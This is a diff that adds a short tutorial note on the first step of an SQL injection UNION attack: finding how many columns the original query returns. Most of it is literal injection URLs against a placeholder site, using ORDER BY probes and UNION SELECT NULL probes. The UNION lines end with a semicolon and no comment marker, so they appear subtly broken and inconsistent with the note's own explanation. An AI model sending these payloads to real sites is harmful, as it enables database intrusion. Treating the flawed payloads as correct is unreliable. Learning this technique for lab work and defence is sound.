@@ -1,0 +1,32 @@
+1. Determining the number of columns required in an SQL injection UNION attack
+
+For UNION attacks, it is important to know how many columns are returned from the original query.
+
+The first method is appending an ORDER BY statement to your URL.  An ORDER BY statement orders the rows by a specific column, from 1 to n columns.
+
+Say that a query returns 4 columns. (You do not know this yet).  Any of these urls will return the table, though it may be ordered differently each time.
+https://www.website.com/products?category=Category1'+ORDER+BY+1--
+https://www.website.com/products?category=Category1'+ORDER+BY+2--
+https://www.website.com/products?category=Category1'+ORDER+BY+3--
+https://www.website.com/products?category=Category1'+ORDER+BY+4--
+
+The URL below, however, will return an error.
+https://www.website.com/products?category=Category1'+ORDER+BY+5--
+
+This will tell you that the query returns 4 columns.
+
+KEY: Error on ORDER BY n+1 statement and higher.
+
+You can also do this with NULL statements.
+
+The 3 queries below will return an error:
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL;
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL;
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL;
+
+The URL below will return the table along with an empty row.
+https://www.website.com/products?category=Category1'+UNION+SELECT+NULL,NULL,NULL,NULL;
+
+This also indicates to you that there are 4 columns.
+
+KEY: Error on all UNION SELECT n*NULL except when n = the amount of columns in the returned query.
